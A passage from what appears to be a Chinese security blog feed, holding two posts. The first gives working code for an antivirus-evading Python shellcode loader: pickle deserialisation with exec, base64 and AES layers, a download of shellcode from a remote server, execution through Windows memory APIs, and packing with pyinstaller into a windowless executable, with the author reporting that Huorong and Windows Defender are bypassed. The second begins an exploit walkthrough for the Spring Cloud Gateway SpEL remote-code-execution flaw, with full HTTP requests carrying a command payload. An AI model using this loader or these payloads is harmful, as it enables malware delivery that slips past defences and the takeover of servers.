class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659016998797-c142daf1-7ec6-48be-9a09-8bbb160a71f5.png" alt="image.png"></p><h3 id="打包执行"><a href="#打包执行" class="headerlink" title="打包执行"></a>打包执行</h3><p>pyinstaller</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">pyinstaller --noconsole --onefile demo1.py -i favicon.ico -n demo1 <br><br>--onefile 打包一个单个文件<br>--noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)<br>-i 设置生成执行文件的图标<br>-n 设置生成执行文件的名字<br><span class="hljs-comment"># pyinstaller参数可参考：https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659074699429-f08e9505-e1d3-406a-8413-17fa14981406.png" alt="image.png"><br>可以看到病毒被查到了</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>经历了上面的操作，使用<code>pyinstaller</code>打包我们的程序依旧会被查杀。</p><p>因为我们使用的加载器本身关键语句已经被检测，因此我们需要对其进行进一步处理从而绕过静态查收、我们绕过的方式例如：混淆、编码、加密等方式对代码进行处理，然后调用执行。但是像执行命令的<code>exec、eval</code>等函数特征比较明显，所以我们对他进行进一步处理。</p><p>和其他语言一样，python也有反序列化功能，官方库里提供了pickle&#x2F;Cpickle的库用于序列号和反序列化，可以序列化python的任何数据结构，包括一个类，一个对象。</p><p>python反序列化中，有几个内置方法会在对象反序列化时调用，这一点和PHP中的<code>——wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时，都会自动调用这类函数。（扩展：python中的反序列化安全问题）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">__reduce__()<br>__reduce__ex__()<br>__setstate__()<br><br>可参考官方文档：https://docs.python.org/zh-cn/dev/library/pickle.html<br><br></code></pre></td></tr></table></figure><p>以<code>__reduce__()</code>为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    a = <span class="hljs-number">1</span><br>    b = <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">print</span>, (self.a + self.b,))<br><br><br>serialize = pickle.dumps(A()) <span class="hljs-comment">#序列化</span><br><span class="hljs-built_in">print</span>(serialize)<br><br>unserialize = pickle.loads(serialize) <span class="hljs-comment"># 反序列化</span><br><span class="hljs-built_in">print</span>(unserialize)<br></code></pre></td></tr></table></figure><p>通过<code>pickle</code>的<code>loads</code>来反序列化并自动执行了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659079606535-5c7c7b54-f774-462b-8136-78d33d9d23a5.png" alt="image.png">从输出的结果我们还是可以看到调用的关键函数名称、可以对其进行混淆、编码、加密等操作，这里以<code>Base64</code>编码为例，序列号、编码、解码、反序列化代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    a = <span class="hljs-number">1</span><br>    b = <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">print</span>, (self.a + self.b,))<br><br><br>serialize = pickle.dumps(A()) <span class="hljs-comment">#序列化</span><br><span class="hljs-built_in">print</span>(serialize)<br><br>en_serialize = base64.b64encode(serialize) <span class="hljs-comment"># base64加密</span><br><span class="hljs-built_in">print</span>(en_serialize)<br><br>unserialize = pickle.loads(base64.b64decode(en_serialize)) <span class="hljs-comment"># base64解密&amp;反序列化</span><br><span class="hljs-built_in">print</span>(unserialize)<br></code></pre></td></tr></table></figure><p>从代码层面来看，看到的是一段正常的base64编码以及反序列化的脚本文件，达到bypass的效果。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659080130923-637191a3-82e7-44c2-ab31-a19a984d6e40.png" alt="image.png"></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h2 id="反序列化应用"><a href="#反序列化应用" class="headerlink" title="反序列化应用"></a>反序列化应用</h2><p>综合上述利用反序列化来进行对ShellCode加载来处理：<br>先进行序列化操作并进行base64编码，得到base64编码后的序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> codecs<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">shellcode = urllib.request.urlopen(&#x27;http://192.168.85.128:8000/text.txt&#x27;).read()</span><br><span class="hljs-string">shellcode = base64.b64decode(shellcode)</span><br><span class="hljs-string">shellcode =codecs.escape_decode(shellcode)[0]</span><br><span class="hljs-string"></span><br><span class="hljs-string">shellcode = bytearray(shellcode)</span><br><span class="hljs-string"></span><br><span class="hljs-string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="hljs-string"></span><br><span class="hljs-string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="hljs-string">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="hljs-string">    ctypes.c_uint64(ptr), </span><br><span class="hljs-string">    buf, </span><br><span class="hljs-string">    ctypes.c_int(len(shellcode))</span><br><span class="hljs-string">)</span><br><span class="hljs-string"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="hljs-string">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_uint64(ptr), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="hljs-string">)</span><br><span class="hljs-string"># 等待上面创建的线程运行完</span><br><span class="hljs-string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(shellcode,))<br><br><br>serialize = pickle.dumps(A()) <span class="hljs-comment">#序列化</span><br><br><br>en_serialize = base64.b64encode(serialize) <span class="hljs-comment"># base64加密</span><br><span class="hljs-built_in">print</span>(en_serialize)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659268530851-957ab794-4756-4e32-90d5-305bae1781ae.png" alt="image.png"><br>再进行base64解码、反序列化操作，执行脚本，正常上线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br>ret_base64  = <span class="hljs-string">b&#x27;gASV2wMAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFi8AwAACnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly8xOTIuMTY4Ljg1LjEyODo4MDAwL3RleHQudHh0JykucmVhZCgpCnNoZWxsY29kZSA9IGJhc2U2NC5iNjRkZWNvZGUoc2hlbGxjb2RlKQpzaGVsbGNvZGUgPWNvZGVjcy5lc2NhcGVfZGVjb2RlKHNoZWxsY29kZSlbMF0KCnNoZWxsY29kZSA9IGJ5dGVhcnJheShzaGVsbGNvZGUpCgpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CgpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCgoKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBidWYsIAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCiMg5Yib5bu65LiA5Liq57q/56iL5LuOc2hlbGxjb2Rl6Ziy5q2i5L2N572u6aaW5Zyw5Z2A5byA5aeL5omn6KGMCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkKKQojIOetieW+heS4iumdouWIm+W7uueahOe6v+eoi+i/kOihjOWujApjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGhhbmRsZSksY3R5cGVzLmNfaW50KC0xKSmUhZRSlC4=&#x27;</span><br>pickle.loads(base64.b64decode(ret_base64))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659268633405-b3f23b8c-fadd-49a7-b345-b3428c1137a6.png" alt="image.png"></p><h2 id="生成可执行文件"><a href="#生成可执行文件" class="headerlink" title="生成可执行文件"></a>生成可执行文件</h2><p>pyinstaller</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">pyinstaller --noconsole --onefile demo1.py -i favicon.ico -n demo1 <br><br>--onefile 打包一个单个文件<br>--noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)<br>-i 设置生成执行文件的图标<br>-n 设置生成执行文件的名字<br><span class="hljs-comment"># pyinstaller参数可参考：https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659074699429-f08e9505-e1d3-406a-8413-17fa14981406.png" alt="image.png"><br>依然会报错</p><h2 id="使用AES加密绕过"><a href="#使用AES加密绕过" class="headerlink" title="使用AES加密绕过"></a>使用AES加密绕过</h2><p>首先把我们生成的base64编码进行AES加密，让后将加密后的数据进行base64编码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659516411740-8dedf3f1-ed9b-4614-a02c-9024e9706ba0.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle <span class="hljs-keyword">as</span> json<br><br>ret_aes = <span class="hljs-string">b&#x27;/SoWWB9zk27aPGZuWyqF+ZV0tk6VqgbxsHfGbf2qYL1ssfTDF8FhoeE8gHJnzotW77ajUXTQv1KoRpyICajOG7dSvDHvEIvMq/gtauTCSk/kcWqqGHyyz5l5mZxpQomFWanHCmpQx1sozy8f+ZoQdcq+++AsGrLf1sHwVeriNPWIhCPaNjsIKHUAftvZiFYBLQlfLRE21NwdSsYZCdwf0AFHphFZub+78+TxQRSE75eQyhEUq7SLhs4b7unzGqFGKUEMTXg6xIvzEExpyknlV0ntMm9swqLH5QLZI+xMK8YUhdWp65aPj4xCz2K7MlKv8RtLTj4mYhX7Xvj/ZTmRlramOqJtPFE4PceRR7TCetRDZokf/fkmi3VnteQGhDXoWXnWlSGMI/PMeR6XY9mxfPgtaBlqE5YclHEQLM0JQvIM4b74t45iz6DwgEGuiUQYqqjkTGhVMdbmd/dpVu48eT3nIql0UAbrndHDNOadqRTnUOQ2Jcu+wllcw8cz/unpsz/YvI/KA92qlkyqBV5W+3yHo01QAwJQLMvsAlgqurtgyEqJV7j9Un1q+g5O/1ssVGgcJeTrfUGELk3ToK8r/pxLKsJX4Yokp1caoyS1Se/oTmK5uX3JXS0v7BL9kp456TNxORFbnqqAgux7kDdjei7cb2qrsQ3LtqUhNjMuFmkWWmywiHZmfeNdRiNVEkwkZwXzPevFmaVDwKRJEwzyc5SMg/0I63MaP72ZB+trkfXEtKrDIMDhDdpabuWAV6aMWSP8z1TcN0uwnFzbhtAdXqMWFzwbLwz6RB6FtErgBt85KoCkZUEi9U0fFNviGu1CU7yjrOSNKiPGVSzIvvoiM4I6BDUWmYtiSYAG3LrF7f3G39/qLgVqGf98cja6T+uQhVdiN4ZE3roZBEwKqo1BoOw0xxmq3SacbWSibZBm4JazxbsgFT495il5N+nS5KY584zd4xL9ZJnIyMk5d/mijph1XPmKRWq15b2iNP6oxrKsNAGDIH4pgKQaMCitHKPpBF6g63xkVbyjBUnTQcOEVdvmIoKWbk8GWUkuAncend/FV92Fie09j7H5QaLR8J1mEEjHO5SrHbHW5VSqaXOIc4tNzXWIS0aT+Pw30nxVtNOgpAbvWzcaiV5aCpjMznXBI2guj9Qem1AFuChoFOQnYQxJxtjKkWxQXBto6SBOlBgSqsU9OubO545NEOARaM3IgluhxO3o0tI54+7c7Z5jtBM7QR1zidH+7EvpoMG8Q0gz9uHe1G5CLJu7Vyc0ro7Me3FCmwrsMbTzXYuLin6wVcVkBHqjCXxWZQ7P98ndnYUVZr0VPAe/LeJzCBDq8MtwSYTX+6p56wv3uDNefM8ZqYGqHAahArYmm4vQGJpLu6YKeD3BwyNvPImH4qjVTBuZ1OWZ6J4/N2bKdqUxbv1kuT/DPt6BciVXvkcilbiQYWO+ttOROvS1XxKetRsMAeF2HQX00z4oOgcAEM7bK9luKpatIcbKexYlMHEAIBp5YxXgRvovuckcmUDrBChteV1VF04lnI9rPWfK5aMEN1OdCpubJwO/Yl2TY6KanTjNsujpjbXGe2RL8qiSaxFaFnM3JFcm1uGrEX8I6ektuDESXDBbmXONGrxV7d3Sb7lqrNSTIsAKrVelZLOEr+Z/cURaCizV6MyWrhdHP69Sf5tGVgoahIs/PqkW+0VchGDfMutLoB3M5XwsUfmlSGREaCTKxkfyahVpeVGbQkdh/qv8ZLMTgly9nv0dFljcFcnyHGZBepwtGw9e1allThkYDwhs&#x27;</span><br><br><span class="hljs-comment"># base64解密</span><br>ret = base64.decodebytes(ret_aes)<br><br><span class="hljs-comment"># AES解密</span><br>aes = AES.new(<span class="hljs-string">b&quot;1234567812345678&quot;</span>,AES.MODE_CBC,<span class="hljs-string">b&quot;0000000000000000&quot;</span>).decrypt(ret).rstrip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment"># 反序列化</span><br>json.loads(base64.b64decode(aes))<br><br><br></code></pre></td></tr></table></figure><p>此时打包文件，可以看到火绒和Windows_DF都成功绕过<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659515288988-e5a00fda-b7b1-47fc-97f0-f965da3b5cf4.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659515379826-fbaf1324-06f5-40ce-87c5-ce25bf5c2c11.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1659515519109-14351dab-55d3-4f4b-ac0f-03a257e6ba4f.png" alt="image.png"></p><p>VT显示有7家扫描出来了。<br>后期可以再加一个壳，对特征码，资源进行修改，相信会得到一个不错的免杀🐎。</p><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>Python 编译二进制程序，体积太大</li><li>Python 病毒误报率太高了，打包一个print语句程序都会报毒，尽量选择其他语言。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass_AV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringCloud GateWay</title>
    <link href="/2022/03/13/CVE-2022-22947%20SpringCloud%20GateWay%20SpEL%20RCE/"/>
    <url>/2022/03/13/CVE-2022-22947%20SpringCloud%20GateWay%20SpEL%20RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/spring-cloud/spring-cloud-gateway<br><span class="hljs-built_in">cd</span> spring-cloud-gateway<br>git checkout v3.1.0<br></code></pre></td></tr></table></figure><p>idea启动。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="添加规则"><a href="#添加规则" class="headerlink" title="添加规则"></a>添加规则</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/gateway/routes/hacker</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.131:9000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>432<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.131:9000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.131:9000/actuator/gateway/routes<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-coffeescript">&#123;</span><br><span class="language-coffeescript">    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span>,</span><br><span class="language-coffeescript">    <span class="hljs-string">&quot;filters&quot;</span>: [</span><br><span class="language-coffeescript">        &#123;</span><br><span class="language-coffeescript">            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;AddResponseHeader&quot;</span>,</span><br><span class="language-coffeescript">            <span class="hljs-string">&quot;args&quot;</span>: &#123;</span><br><span class="language-coffeescript">                <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-keyword">new</span> java.lang.<span class="hljs-built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]&#123;\<span class="hljs-string">&quot;whoami\&quot;&#125;).getInputStream()))&#125;&quot;</span>,</span></span></span><br><span class="hljs-subst"><span class="hljs-string"><span class="language-coffeescript">                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cmd&quot;</span></span></span></span><br><span class="hljs-subst"><span class="hljs-string"><span class="language-coffeescript">            &#125;</span></span></span><br><span class="hljs-string"><span class="language-coffeescript">        &#125;</span></span><br><span class="hljs-string"><span class="language-coffeescript">    ],</span></span><br><span class="hljs-string"><span class="language-coffeescript">    &quot;</span>uri<span class="hljs-string">&quot;: &quot;</span>http://example.com:<span class="hljs-number">80</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-coffeescript">    &quot;</span>order<span class="hljs-string">&quot;: 0</span></span><br><span class="hljs-string"><span class="language-coffeescript">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1656917467950-b730260e-4da4-4936-9bab-bc228a736d3d.png" alt="image.png"></p><h3 id="刷新"><a href="#刷新" class="headerlink" title="刷新"></a>刷新</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/gateway/refresh</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.131:9000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.131:9000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.131:9000/actuator/gateway/routes<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1656915899838-4cc838b9-9007-4293-b028-2186f8862535.png" alt="image.png"></p><h3 id="再次访问"><a href="#再次访问" class="headerlink" title="再次访问"></a>再次访问</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/actuator/gateway/routes/hacker</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.131:9000<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1656917662818-a96cb931-7b3a-40ea-9ca2-f8600e2e9856.png" alt="image.png"></p><h3 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">DELETE</span> <span class="hljs-string">/actuator/gateway/routes/hacker</span> <span 